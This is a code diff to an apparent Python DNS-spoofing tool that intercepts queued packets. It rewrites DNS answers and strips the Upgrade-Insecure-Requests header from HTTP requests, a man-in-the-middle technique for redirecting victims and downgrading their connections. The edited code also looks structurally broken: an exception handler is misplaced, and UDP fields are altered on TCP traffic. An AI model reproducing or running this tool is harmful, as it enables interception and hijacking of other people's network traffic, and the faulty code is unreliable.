@@ -34,21 +34,8 @@ class Dns_spoof:
         
     def call_back(self, bin_packet):
         packet = IP(bin_packet.get_payload())
-        if packet.haslayer(HTTPRequest):
-            try:
-                upgradeReq = packet[HTTPRequest].Upgrade_Insecure_Requests
-                if upgradeReq == 1:
-                    del packet[HTTPRequest].Upgrade_Insecure_Requests
-                    del packet[IP].len
-                    del packet[IP].chksum
-                    del packet[UDP].len
-                    del packet[UDP].chksum
-            except IndexError as error:
-                return False
-            packet.summary()
+        if packet.haslayer(DNSRR):
             packet.show()
-            bin_packet.set_payload(bytes(packet))
-        elif packet.haslayer(DNSRR) :
             try:
                 queryName = packet[DNSQR].qname.decode()
                 #if queryName in self.host:
@@ -61,9 +48,23 @@ class Dns_spoof:
                     del packet[IP].chksum
                     del packet[UDP].len
                     del packet[UDP].chksum
+                except IndexError as error:
+                    return False
+            packet.summary()
+            bin_packet.set_payload(bytes(packet))
+        elif packet.haslayer(HTTPRequest):
+            try:
+                upgradeReq = packet[HTTPRequest].Upgrade_Insecure_Requests
+                if upgradeReq == 1:
+                    del packet[HTTPRequest].Upgrade_Insecure_Requests
+                    del packet[IP].len
+                    del packet[IP].chksum
+                    del packet[UDP].len
+                    del packet[UDP].chksum
             except IndexError as error:
                 return False
             packet.summary()
+            packet.show()
             bin_packet.set_payload(bytes(packet))
         return bin_packet.accept()
 
